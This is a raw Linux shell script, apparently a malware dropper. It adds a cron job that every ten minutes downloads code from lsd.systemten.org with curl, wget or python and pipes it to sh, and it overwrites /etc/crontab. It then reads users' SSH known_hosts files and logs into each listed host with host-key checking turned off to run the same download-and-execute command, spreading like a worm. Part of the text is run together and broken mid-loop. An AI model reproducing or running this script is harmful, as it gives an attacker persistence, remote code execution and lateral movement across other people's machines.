export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin mkdir -p /tmp chmod 1777 /tmp echo "*/10 * * * * (curl -fsSL -m15 lsd.systemten.org||wget -q -T15 -O- lsd.systemten.org||python -c 'import urllib;print urllib.urlopen(\"http://lsd.systemten.org\").read()')|sh"|crontab - cat > /etc/crontab </dev/null 2>&1 &" & done fi for file in /home/* do if test -d $file; then if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "(curl -fsSL lsd.systemten.org||wget -q -O- lsd.systemten.org||python -c 'import urllib;print urllib.urlopen(\"http://lsd.systemten.org\").read()')|sh >/dev/null 2>&1 &" & done fi fi done #